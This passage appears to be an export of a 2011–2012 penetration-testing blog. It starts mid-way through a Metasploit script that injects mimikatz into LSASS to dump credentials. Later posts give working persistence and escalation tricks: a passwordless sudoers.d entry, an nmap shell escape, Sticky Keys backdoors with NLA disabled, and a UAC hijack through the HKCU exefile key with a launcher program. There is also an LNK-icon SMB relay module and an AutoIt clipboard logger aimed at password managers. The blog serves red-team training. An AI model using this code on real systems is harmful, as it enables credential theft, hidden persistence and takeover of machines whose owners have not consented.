pipe won't write or read if # too much was written or read by the \"client\" (us) pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil) # Check to see if our end of read check is there: n000 @00 if pull['lpBuffer'] == \"@00\" and newline == true good2go = true else readstring \u003c\u003c pull['lpBuffer'] end # Ready the newline var for previous check on next loop if pull['lpBuffer'] == \"n00\" newline = true else newline = false end end print_status(readstring.join(\"\")) end print_status(\"x86 Detected - Using x86 mimikatz\") handle = client.railgun.kernel32.CreateNamedPipeW('\\\\\\\\.\\\\pipe\\\\kiwi\\\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return'] print_status(\"Handle: #{handle}\") framework.threads.spawn('injectlsass',false) { pid = client.sys.process['lsass.exe'] print_status(\"LSASS located at PID: #{pid}\") pathtomimi = \"C:\\\\sekurlsa.dll\" pay = client.framework.payloads.create(\"windows/loadlibrary\") pay.datastore[\"DLL\"] = pathtomimi pay.datastore[\"EXITFUNC\"] = 'thread' raw = pay.generate targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) mem = targetprocess.memory.allocate(raw.length + (30024)) targetprocess.memory.write(mem, raw) sleep(2) targetprocess.thread.create(mem, 0) print_status(\"Successfully Injected into LSASS\") } print_status(\"Waiting for LSASS injection to complete\") connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil) print_status(\"Mimikatz has called home, ready for command\") sleep(2) print_status(\"Reading banner\") client.railgun.kernel32.ReadFile(handle,248,248,4,nil) print_status(\"Doing a quick ping to make sure things are wor","date":"2012-06-15","objectID":"https://malicious.link/posts/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/:0:0","tags":null,"title":"Integration of Mimikatz into Metasploit Stage1","uri":"https://malicious.link/posts/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/"},{"categories":["sudo","post exploitation","linux"],"content":"I found a number of things interesting when reading the following post: http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ Too bad that nmap’s interactive mode was taken out, but there are a great number of other such methods, most notably VI’s shell mode. But when I started looking into appending or inserting lines into /etc/sudoers for CCDC, I happened upon an interesting function of that file. Near the end of the file there are two lines: # See sudoers(5) for more information on \"#include\" directives: #includedir /etc/sudoers.d Both look commented out, but in actuality, exactly as-is the #includedir line is interpreted and acted upon. So any file that you put in the /etc/sudoers.d directory counts as an extension of the /etc/sudoers file. Make a small edit to the default README file with a bunch of added # commented out lines copied directly from the sudo man page, with a nobody ALL = NOPASSWD: ALL or www-data plus a webshell makes for easy re-exploitation. Just an evil way to stay hidden on a ’nix box… **Update: ** nmap --script \u003c(echo \"os.execute('/bin/sh')\") ’nuf said… (thanks @bonsaiviking ) ","date":"2012-05-26","objectID":"https://malicious.link/posts/2012/2012-05-26-sudoers-commented-includes-used-for-evil/:0:0","tags":null,"title":"SUDOERS Commented Includes used for Evil","uri":"https://malicious.link/posts/2012/2012-05-26-sudoers-commented-includes-used-for-evil/"},{"categories":["post exploitation","phantomjs","web"],"content":"If you have never heard of PhantomJS ( http://phantomjs.org/ ) before, it’s a “Full Web Stack with No Browser Required”, basically it a GUI-less browser. One of the magical “example” files that it has is called “rasterize.js” Rasterize.JS essentially renders a URL, screen shots it and give it to you in a number of different formats, here’s it’s usage: Usage: rasterize.js URL filename [paperwidth*paperheight|paperformat] paper (pdf output) examples: \"5in*7.5in\", \"10cm*20cm\", \"A4\", \"Letter\" PhantomJS is sweet for sweeping a ton of IPs and suspected HTTP/S sites, and look through a gallery of them to start figuring out which looks the most interesting… and we are going to essentially just that, except from a Victim machine. First, download the Win32 static bins for PhantomJS from: http://code.google.com/p/phantomjs/downloads/list Pull out phantomJS.exe and rasterize.js from the zip, and upload it to your victim. Make a special directory for your renderings (I use imgs), this also makes it easy for meterpreter to download it since meterpreter supports directories and download targets. Now make a BAT file with the following in it: FOR /F \"skip=3 delims= \" %%A IN ('NET VIEW') DO start /b phantomjs.exe examplesrasterize.js http://%%A imgshttp_%%A.png FOR /F \"skip=3 delims= \" %%A IN ('NET VIEW') DO start /b phantomjs.exe --ignore-ssl-errors=yes examplesrasterize.js https://%%A imgshttps_%%A.png There are some cool tricks in here. First we are using ’net view’ as our target list, we are using the ‘start /b’ command to throw everything into the background to run so we don’t have to wait for each to finish (a crude way to thread actions in BAT files). And finally we are checking for both HTTP and HTTPS. We we are not doing however is doing any logging, so if you want to catch errors it’s all you, just remember that when trying to pipe output from a command started with ‘start’ you have to prefix the \u003e with a ^ so it looks like: start echo blah ^\u003e blah.txt You are ALMOST ready to rock. There is a slight bug in Rasterize.js, if it can’t resolve the address or otherwise can’t contact the web server (which is going to be the majority of the case for us) it hangs in an open state. This is bad, we don’t want to have a thousand phantomjs.exe processes running hanged. Simply make a new line after LINE 20, and add ‘phantom.exit();’ so it knows to exit if it encounters a failed connection. Thats it, happy hunting from both inside and outside. P.S. PhantomJS supports SOCKS and HTTP proxies, so if you use them (Tor) or run into them internally, support is there. A quick mod to your batch file and you’re golden: --proxy=address:port Sets the network proxy (e.g. \"--proxy=192.168.1.42:8080\") --proxy-auth=username:password Sets authentication details for the proxy (basic auth) --proxy-type=[http|socks5] Sets the proxy type, either \"http\" (default) or \"socks5\" ","date":"2012-05-25","objectID":"https://malicious.link/posts/2012/2012-05-25-post-exploitation-with-phantomjs/:0:0","tags":null,"title":"Post Exploitation with PhantomJS","uri":"https://malicious.link/posts/2012/2012-05-25-post-exploitation-with-phantomjs/"},{"categories":["persistance","sethc","utilman"],"content":"At CCDC, Sticky Keys via RDP was a very successful re-entry point for the Red Team. You can read more about how this works here: http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html So if you can get physical access or SYSTEM/Admin access at some point and enable + reach RDP, you can very easily follow those instructions and gain a level of persistance without the need of a pesky password :-) However, this doesn’t work so well with the advent of NLA or Network-Level-Authentication, which was enabled for Vista systems and beyond. In particular Win 2008 R2 uses it by default. StickyKeys don’t work so well if you have to authenticate first. Boo! But, if you are already on a box with Admin access for a time, you can make one additional change so that you are back to Sticky Key and Utilman heaven. HKEY_LOCAL_MACHINESystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp Change the value of **UserAuthentication **value to 0, and instantly you are back to slamming the shift key and popping system shellz. – mubix P.S. I ran into permissions errors when trying to copy cmd.exe over sethc.exe and utilman.exe: But a brilliant fix to this annoying security control ;-) was provided here: http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html?showComment=1335891005473#c7632690272609583721 By setting CMD as the debugger for sethc.exe or utilman.exe Windows executes the debugger first, so back shelling again. ","date":"2012-05-24","objectID":"https://malicious.link/posts/2012/2012-05-24-sticky-keys-and-utilman-against-nla/:0:0","tags":null,"title":"Sticky Keys and Utilman against NLA","uri":"https://malicious.link/posts/2012/2012-05-24-sticky-keys-and-utilman-against-nla/"},{"categories":["derbycon","training","cons"],"content":"@egypt and I have teamed up this year to teach at DerbyCon at the end of September. Here is the very basic outline of the class and subject to change: (Sign up here: https://www.derbycon.com/training-courses/ ) THURSDAY Intro to the Framework The history of the Framework Ninja Demo Usage Recon Exploitation Pillaging Post modules Intro to Ruby Getting your environment set up Ruby Basics Strings, Arrays, and Methods oh my IRB, Pry - The No-Spoon Portion Navigating Documentation Module Writing Auxiliary Modules Exploit Modules Post Modules Railgun (Windows and ?Linux?) Meterpreter(s) The Dread Pirate Reporting LAB, LABs and more LABS FRIDAY CTF + open LAB time definitely open to requests for content, if you, as a student, would like a particular topic included. ","date":"2012-05-22","objectID":"https://malicious.link/posts/2012/2012-05-22-derbycon-training-sep-27-28-2012/:0:0","tags":null,"title":"DerbyCon Training (Sep 27-28 2012)","uri":"https://malicious.link/posts/2012/2012-05-22-derbycon-training-sep-27-28-2012/"},{"categories":null,"content":"If you haven’t heard already about Jasager.. well you probably don’t read this blog, but for those who want to know a bit more about the history of Jasager - Karma on the Fon, where the project is now, and where it’s headed, then buckle up, and hang on while we first travel down memory lane. ","date":"2012-05-12","objectID":"https://malicious.link/posts/2012/jasager-past-present-future/:0:0","tags":["jasager","hak5","pineapple"],"title":"Jasager - Past, Present and Future","uri":"https://malicious.link/posts/2012/jasager-past-present-future/"},{"categories":null,"content":"History: The time was ShmooCon 2006. It was my very first “HACKER” convention. I was there with my buddies from Hak5 and SploitCast. I just so happened to sit in a talk by Dino (A. Dai Zovi). He was talking about Karma, his project that basically sat in the middle of wireless connections and instead of picking out the special bits directed his way, Karma accepted and responded to them all. I was in love, no not with Dino, but the project. I wrote theta44.org in my notebook and continued on with the craziness that is any con. Having no money to invest in a wireless card that could handle Karma that page with theta44.org kept hounding me. In early 2007, boxgamex (a gentlemen from the Hak5 community) sold me a little Fonera router. What’s the first thing I did? Hack it, put OpenWRT and DD-WRT on it. But one day that page in my notebook showed up again and reminded me of Karma. I looked on Dino’s page and was appalled to find that the project hadn’t gone anywhere. Did no one see the potential that this project had? Putting 2 + 2 (=5) I decided to put Karma on the Fon for an ultra portable wifi attack tool. Well, I am by no means the Killer Coding Ninja Monkey that either Dino or Robin Wood are. I scripted my way into it working for one target at a time. The problem? I did all the work on the Fon. You can see where this is going. At DEFCON 15, I brought my scripted up Fon to test it out in the shark infested waters (Wall of Sheep addition?). Got excited to be there, booted the Fon up in my room, connected to the Fon and change a setting. The Fon bricked. No proof that I had done anything, didn’t even get the chance to test it out. I explained what had happened to my friend Darren Kitchen, and the project really sparked in him. He talked to the Killer Coding Ninja Monkey that I mentioned before Robin Wood, and before you know it, the project was renewed under a new name “Jasager”, and this time with a better hand at the wheel. Enough of the history lesson, lets get some information. Here is the home page of Jasager: http://www.digininja.org/jasager/index.php HINT: Digininja’s main site, while lacking style has some things that you also want to check out. (digininja.org) If you like reading, here is Darren’s blog post on how to get Jasager going: http://www.darrenkitchen.net/jasager-step-by-step-unlocking-install-guide If you are more of a visual person, check out episode 405 of Hak5: http://www.hak5.org/episodes/episode-405 And if you have problems or want to discuss options and configurations with other Jasager http://hak5.org/forums/index.php?showforum=49 ","date":"2012-05-12","objectID":"https://malicious.link/posts/2012/jasager-past-present-future/:1:0","tags":["jasager","hak5","pineapple"],"title":"Jasager - Past, Present and Future","uri":"https://malicious.link/posts/2012/jasager-past-present-future/"},{"categories":null,"content":"Back to the Furture: MITM attacks on computer systems have been around since the dawn of time. The natural (rapid) progression of security attacks made it guaranteed that MITM would hit Wireless just as hard. If you have ever talked on a CB Radio, you know the frustration when the kids with the high powered antenna start playing the Mortal Kombat soundtrack over the CB without letting up. This is a simple example of how Jasager works. It gets in the middle of wireless communications. How do you protect against something like that? I don’t know. I don’t believe that there is a protection for Jasager or Karma (again, released in 2006). Where is Jasager heading? I think that adding the functionality of Karmetasploit (H.D. Moore’s project) to a portable device and then maybe shipping that device like the guys over at Errata Security did with an iPhone, would be one dangerous route. Or puttying it in a box like Richard Mogull did. Or in a wall like Larry Pesce did. To the future? What if I could put this whole project on a USB stick that didn’t do anything but draw power so it could run Jasager + Karmetasploit? Maybe running it on the NeoPwn? The possibilities are endless with this project. For all those feed readers out there, you can keep up with the latest and greatest form Robin Wood and the Jasager project via their RSS feed. http://www.metasploit.com/dev/trac/wiki/Karmetasploit Dino’s Link: http://blog.trailofbits.com/ Dino’s Twitter: http://twitter.com/dinodaizovi Karma’s Links: http://blog.trailofbits.com/karma/ Boxgamex’s Link: http://twitter.com/boxgamex ","date":"2012-05-12","objectID":"https://malicious.link/posts/2012/jasager-past-present-future/:2:0","tags":["jasager","hak5","pineapple"],"title":"Jasager - Past, Present and Future","uri":"https://malicious.link/posts/2012/jasager-past-present-future/"},{"categories":["mimikatz","presentations"],"content":"A friend of mine is presenting at phDays in Moscow at the end of May. If you are in the area, or can be, I would highly recommend you attend, and in particularly his talk. His blog is here: http://blog.gentilkiwi.com/ And since a picture is worth a thousand words: You should really go check out what he is going to present… just sayin' ","date":"2012-04-26","objectID":"https://malicious.link/posts/2012/2012-04-26-phdays-in-moscow/:0:0","tags":null,"title":"phDays in Moscow","uri":"https://malicious.link/posts/2012/2012-04-26-phdays-in-moscow/"},{"categories":["presentations","ccdc"],"content":"Since this is a constantly updating slide deck I figured I’d post it here so I didn’t have to keep emailing it out. ;-) If you have comments or if something is wrong grammatically, technically or in any other way I’d love input. Suggestions also welcome. Here is a link straight to the doc if you want to comment or add it to your google docs list: https://docs.google.com/presentation/d/1pPXLg3KqwSMLRCNRfows5QnVI2mLjSmll5vN2WHMFJg/edit ","date":"2012-03-19","objectID":"https://malicious.link/posts/2012/2012-03-19-how-to-win-ccdc-slides/:0:0","tags":null,"title":"How to Win CCDC - Slides","uri":"https://malicious.link/posts/2012/2012-03-19-how-to-win-ccdc-slides/"},{"categories":["rant"],"content":"This was an honest idea to help identify people that might not get the media attention of other “Top X in Infosec” lists. But I should have known better than to put a poll on the internet… ","date":"2012-03-04","objectID":"https://malicious.link/posts/2012/2012-03-04-who-is-on-your-dream-team-red-team/:0:0","tags":null,"title":"Who is on your dream team red team?","uri":"https://malicious.link/posts/2012/2012-03-04-who-is-on-your-dream-team-red-team/"},{"categories":["lnk","metasploit","mona"],"content":"I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it’s target. Of course the first place I looked was Meterpreter’s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to work with COM objects. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch using the spec.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz Enter mona, the Corelan Team’s exploit development plugin for Immunity Debugger. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist. We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona: I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued: “!mona header C:\\autoexec.lnk” As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw: header \u003c\u003c Rex::Text.to_unicode(\"C:\\%\\\\\\\\192.168.100.100\\\\w00t\\\\bogusimage.png`\") I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief. Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what? Now I have 3 challenges: It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user. It needs to upload the file to the exploited system. It needs to be up to code on the Metasploit coding standards Changing the line I found for the share name into this: lnk \u003c\u003c Rex::Text.to_unicode(\"\\\\\\\\#{datastore['LHOST']}\\\\#{datastore['SHARENAME']}\\\\#{datastore['ICONFILENAME']}`\") ‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module: OptAddressRange.new(\"LHOST\", [ true, \"Host listening for incoming SMB/WebDAV traffic\", nil]), OptString.new(\"SHARENAME\", [ true, \"Share name on LHOST\", \"share1\"]), OptString.new(\"ICONFILENAME\", [ true, \"File name on LHOST's share\", \"icon.png\"]) OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname. Problem 1 solved. Problem 2 was just as easy, the following line: file = client.fs.file.new(datastore['LNKFILENAME'], 'wb') creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it. Problem 3 is much more tricky, but here is the path to wisdom: ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb Hope this helps spur people into trying their hand at developing some modules of their own. ","date":"2012-02-19","objectID":"https://malicious.link/posts/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/:0:0","tags":null,"title":"Developing the LNK Metasploit post module with Mona","uri":"https://malicious.link/posts/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/"},{"categories":["lnk","metasploit","smbrelay"],"content":"TL;DR: SMB Relay + LNK UNC icons = internal pentest pwnage I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own. MS08_068: http://www.cvedetails.com/cve/CVE-2008-4037/ In 2008, Microsoft released MS08_068 which patched the “SMB Relay” attack. To boil this down, an attacker gets a victim to attempt to authenticate to an attacker controlled box. The attack delays its responses to the victim and replays the important parts of the authentication that the victim sent back at the victim. You can find out a lot more about this vulnerability here: https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay One thing to take away from that post is that the patch stops Attacker \u003c=\u003e Victim, but does not / cannot fix Victim \u003c=\u003e Attacker \u003c=\u003e Victim2 (use authentication from Victim to replay to Victim2) MS10_046: http://www.cvedetails.com/cve/CVE-2010-2568/ In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut’s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the ‘Change Icon’ button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-) The Setup: If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine’s IP and use SMB_Relay to replay those credentials to a system in which we’ve identified by one means or another as an ‘important’ host to get on. Attacker uploads malicious LNK file to network share on FILE SHARE Victim views it on WORKSTATION that initiates an connection to ATTACKER Attacker relays those authentication attempts to FILE SHARE, gaining code execution if ‘Victim’ is an admin on FILE SHARE If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point. Your mileage will vary based on where you put the LNK file. The Video: I have created a post module to automate the process of creating and uploading the LNK file (so you don’t have to have a Windows box lying around). Here it is in action: Module options (post/windows/escalate/droplnk): Name Current Setting Required Description ---- --------------- -------- ----------- ICONFILENAME icon.png yes File name on LHOST's share LHOST 192.168.2.16 yes Host listening for incoming SMB/WebDAV traffic LNKFILENAME Words.lnk yes Shortcut's filename SESSION 1 yes The session to run this module on. SHARENAME share1 yes Share name on LHOST 2012-02-11 07:17:19 +0000 2 1 post(droplnk) \u003e run [*] Creating evil LNK [*] Done. Writing to disk - C:\\DocuMe~1\\Administrator\\Words.lnk [*] Done. Wait for evil to happen.. [*] Post module execution completed You can find the code here: https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb Going forward: Obviously this isn’t so effective remotely out of the box and there currently isn’t a SMB_Relay for WebDAV (although I’m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host: Step 1: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect an","date":"2012-02-11","objectID":"https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/:0:0","tags":null,"title":"MS08_068 + MS10_046 = FUN UNTIL 2018","uri":"https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/"},{"categories":["lnk","metasploit","smbrelay"],"content":"References: SMB_Relay References: “Initial?” release in 2003 - http://www.xfocus.net/articles/200305/smbrelay.html Microsoft advisory - http://technet.microsoft.com/en-us/security/bulletin/ms08-068 Metasploit blog post - https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay Metasploit module - http://www.metasploit.com/modules/exploit/windows/smb/smb_relay LNK DLL Loader References: Microsoft advisory - http://technet.microsoft.com/en-us/security/advisory/2286198 Metasploit blog post - https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening Some of HDM’s research - https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws ISS’s advisory - http://blogs.iss.net/archive/remotedllpreloadingv.html Metasploit module - http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader Video of the module in action - http://www.commonexploits.com/?p=151 ","date":"2012-02-11","objectID":"https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/:0:1","tags":null,"title":"MS08_068 + MS10_046 = FUN UNTIL 2018","uri":"https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/"},{"categories":["presentations","cons","dns","deepmagic"],"content":"This is my talk that I gave at ShmooCon 2012. It was a great honor to be given the chance to speak at ShmooCon as it has been my second home since 2006 (missed the first one… havent missed one since) A @textfiles approach to gathering the world's DNS from Rob Fuller ","date":"2012-02-03","objectID":"https://malicious.link/posts/2012/2012-02-03-a-textfiles-approach-at-gathering-the-worlds-dns-slides/:0:0","tags":null,"title":"A @textfiles approach at gathering the world's DNS - Slides","uri":"https://malicious.link/posts/2012/2012-02-03-a-textfiles-approach-at-gathering-the-worlds-dns-slides/"},{"categories":["uac","meterpreter","railgun","metasploit"],"content":"A number of times during tests I’ve actually run into those mythical creatures called “patched windows machines”. At DerbyCon Chris Gates and I released the “Ask” post module (which I had failed to publish). This module very simply uses the ShellExecute windows function via Railgun with the undocumented (but very well known) operator of ‘runas’. These two lines accomplished that: client.railgun.add_function( 'shell32', 'ShellExecuteA', 'DWORD',[[\"DWORD\",\"hwnd\",\"in\"],[\"PCHAR\",\"lpOperation\",\"in\"],[\"PCHAR\",\"lpFile\",\"in\"],[\"PCHAR\",\"lpParameters\",\"in\"],[\"PCHAR\",\"lpDirectory\",\"in\"],[\"DWORD\",\"nShowCmd\",\"in\"],]) client.railgun.shell32.ShellExecuteA(nil,\"runas\",\"evil.exe\",nil,nil,5) This would quite simply prompt the user with that annoying UAC prompt asking the user to run ’evil.exe’ with Administrative privs. If they are not “Admins” themselves then it would prompt them for the user name and password (normally the case in systems attached to domains). Something to be aware of: If your evil.exe is not code-signed the UAC box will be orange instead of blue. You can get around this a bit by using rundll32.exe (which is signed ;-) ) as is svchost.exe. (You may also want to not name it evil.exe) The downfall here is that 1. You have to drop a binary (boooo) 2. You are prompting the user for UAC control when they didn’t do anything to cause it. Users are generally as smart as bait, but it’s good practice to assume to the contrary. If for nothing else other than to challenge yourself to up your game. Number 1 I’ll leave to another post, so lets solve #2. When a “runas” ShellExecute (which UAC runs natively #hint#hint) a few registry locations are checked. One I’d like to point out is the HKLM\\Software\\Classes\\exefile key. The ’exefile’ as should be obvious is the registry settings for executables, and as such tells Windows how to interact with them. In HKLM (which is only writable by Administrators) the “shell\\open”, “shell\\runas” and “shell\\runasuser” subkeys exist (the structure looks oddly familiar to anyone who visited the ShellExecute page more than once). Inside “shellopencommand” the default string has “%1” %* - this basically means execute the binary %1 and hand the arguments given directly to it %*. Awesome! From here you can alter how every EXE runs on the system (don’t do it, Windows doesn’t like you afterwards, trust me, and remember to snapshot if you don’t). Great, but how does this help us, we aren’t admins. HKCU is writable by the ‘Current User’ hence the name, and it so happens to have a very similar registry path: HKCU\\Software\\Classes. Depending on your system, it may or may not have a “exefile” subkey. If it doesn’t it’s pretty easy to create. Lets make it match the “runas” one in HKLM The tree should look something like this when you are done: HKLM Software Classes exefile shell runas command Under command change the default value to “%1” %* just as it is in HKLM, and add a new String value called ‘IsolatedCommand’ with the same value as default. With these settings, very little has changed on the system or its operation. However, if we change the ‘IsolatedCommand’ String to ’notepad.exe’ and attempt to ‘Run As Administrator’ on that system using any binary guess what happens? Notepad! (as Admin). w00t. Now we can swap in our evil.exe and bob wins right? Sorta. We still have that horrible problem of stealth. Whatever the user was trying to UAC up won’t work, and they’ll try it again, and start investigating the problem, which we don’t want them to do. Enter ‘runyou.exe’, it’s some very simple C++ that weighs in at a whopping 8k when compiled (probably could loose some weight by those who know better compiler options): #include \"windows.h\" #include \"stdio.h\" #include \"tchar.h\" int _tmain(int argc, _TCHAR* argv[]) { if (argv[1]) { ShellExecuteW(NULL,NULL,argv[1],NULL,NULL,SW_SHOW); if (argv[2]) { ShellExecuteW(NULL,NULL,argv[2],NULL,NULL,SW_HIDE); } } return 0; } This code executes the first program visibly and then the s","date":"2012-01-03","objectID":"https://malicious.link/posts/2012/2012-01-03-uac-user-assisted-compromise/:0:0","tags":null,"title":"(UAC) User Assisted Compromise","uri":"https://malicious.link/posts/2012/2012-01-03-uac-user-assisted-compromise/"},{"categories":["hak5","releases","clipboard","autoit"],"content":"Since it’s Christmas and all, I thought I’d post the code snippet from my Hak5 segment a bit early: #include \u003cClipboard.au3\u003e #include \u003cFile.au3\u003e $oldclip = \"\" While 1 $clip = _ClipBoard_GetData() If $clip \u003c\u003e \"0\" Then If $clip \u003c\u003e $oldclip Then _FileWriteLog(@UserProfileDir \u0026 \"clip.log\", $clip) $oldclip = $clip EndIf EndIf Sleep(100) WEnd It’s pretty straight forward, and I welcome everyone to install AutoIt3 and compile/run the above script to see what it does (although most of you I’m sure can figure it out just by reading it). (Think KeePass, 1Password, LastPass…) ","date":"2011-12-26","objectID":"https://malicious.link/posts/2011/2011-12-26-hak5-segment-sneak-peak/:0:0","tags":null,"title":"Hak5 Segment Sneak Peak","uri":"https://malicious.link/posts/2011/2011-12-26-hak5-segment-sneak-peak/"},{"categories":["links","internet"],"content":"When Google Reader decided to remove everything it was good for, we all scrambled to find new homes for things we wanted to share. Tumblr became a place that most of us flocked. I’ve found Tumblr to be not a very good substitue for Google Reader’s functionality (IMHO). The other day, carnal0wnage told me about a service called ‘Buffer’, and all this thing does is do scheduled tweets, but it has one distinct feature, not only is it focused around the sharing of links, it works (if you install the browser plugin/extension) INSIDE OF GOOGLE READER ;-) So you can be reading a feed item, push a button and not have to open a page or another app, it’s pretty much all right there. I know what you’re thinking, cool, but no big deal right? It goes to twitter, and not to a feed that someone can subscribe to. You’re right, and I fought all day trying to figure that part out and finally came up with a twitter search for my tweets and a special hashtag I would use for my shared links. I found the RSS feed for that search and it looks like this: http://search.twitter.com/search.atom?q=from%3Amubix%20%23SharedLinks obviously, this isn’t the easiest or pretty link to send around, so instead I pumped that into Feedburner and now have this for a feed link: http://feeds.feedburner.com/MubixLinks Much easier to share, with one AMAZING added bonus. I can switch the feed that powers it at any time, so from now on, no matter if I use Tumblr or Google Reader (after they unjack themselves) or G+ (if they finally set up a feed for +1’d items), that will always be the link to items that I’ve personally liked and wanted to share. I encourage you to do the same, and leave a comment, so that I can follow your feed back! Oh, and sign up for Buffer here (w/ my referal link ;) http://bufferapp.com/r/7e450 ","date":"2011-12-23","objectID":"https://malicious.link/posts/2011/2011-12-23-shared-links/:0:0","tags":null,"title":"Shared Links","uri":"https://malicious.link/posts/2011/2011-12-23-shared-links/"},{"categories":["Uncategorized"],"content":"Pentest Monkey is a great resource for a lot of things. One of which is this: John The Ripper Hash Formats | pentestmonkey I used it, plus a bit of bash fu to try to figure out some hashes that I was trying to crack. Step 1: Create file of supported hash types. For me, that was simple I just threw the following in ‘supported_types.txt’ in the same directory as john. DES BSDI MD5 BF AFS LM NT XSHA PO raw-MD5 MD5-gen IPB2 raw-sha1 md5a hmac-md5 phpass-md5 KRB5 bfegg nsldap ssha openssha oracle oracle11 MYSQL mysql-sha1 mscash lotus5 DOMINOSEC NETLM NETNTLM NETLMv2 NETNTLMv2 NETHALFLM mssql mssql05 epi phps mysql-fast pix-md5 sapG sapB md5ns HDAA Then it’s as simple as issuing: cat supported_types.txt | xargs -t -I type ./john --pot=unknownhash.pot --wordlist=shortlist.txt --format=type hashfile.txt That will essentially try each of the types on the hash file. It’s important to use a wordlist, and probably a small one initially because if you don’t john will not finish once it gets to the first hash type that it accepts, which may not actually be correct. You can take this a step further and create a hash mangler script that takes a clean hash and adds the few prefixs and suffixs that are common on Pentest Monkey’s list to get the most odds at John picking it up. ","date":"2011-12-12","objectID":"https://malicious.link/posts/2011/2011-12-12-hash-types-for-john-the-ripper/:0:0","tags":null,"title":"Hash Types for John the Ripper","uri":"https://malicious.link/posts/2011/2011-12-12-hash-types-for-john-the-ripper/"},{"categories":["nostarch","internet"],"content":"Our first day of No Starch winner is Russ with Room 362 right next to the Fire Hose ;-) 1st Day of @NoStarch Winner ","date":"2011-12-01","objectID":"https://malicious.link/posts/2011/2011-12-01-first-day-of-a-no-starch-christmas-winner/:0:0","tags":null,"title":"First day of a No Starch Christmas - Winner","uri":"https://malicious.link/posts/2011/2011-12-01-first-day-of-a-no-starch-christmas-winner/"},{"categories":["nostarch"],"content":"This Christmas I’ve decided to spread a little cheer (aka free stuff) ;-) , and I’m doing it in 2600 fashion. Now, I don’t know if I have enough readers to pull this off, but here goes: I will be sending 1 No Starch book of the winner’s choice each day for 12 days starting on December 1st. Here’s the catch. To win the books you must submit a picture of a door or room that is unmistakably ‘Room 362’. The only other stipulation is that the image must be original (meaning if I look it up on TinEye it doesn’t come back with any hits). Once you win you’ll be taken out of selection for other chances but if you submit a picture tomorrow you’ll be eligible to win all 12 days. Also, the more original pictures submitted the better chance you have. How do you submit? Great question. Simply tag Room362’s Google+ page in the photo. And since Google+’s stupid badges require header changes you can just click on this icon: This will be paid for out of my own pocket and will be ordered (not second hand from my book shelf), so I may ask you to choose another book if it’s a box set for $200 or something like that. Why No Starch? Well, I’ll leave that up to you to speculate. Update on 2011-11-28 00:04 by Rob Fuller Yes, I’m ok with international shipping, but it may not get these before Christmas if it is. Funny, inventive, crazy, artistic, cool, etc are all pluses 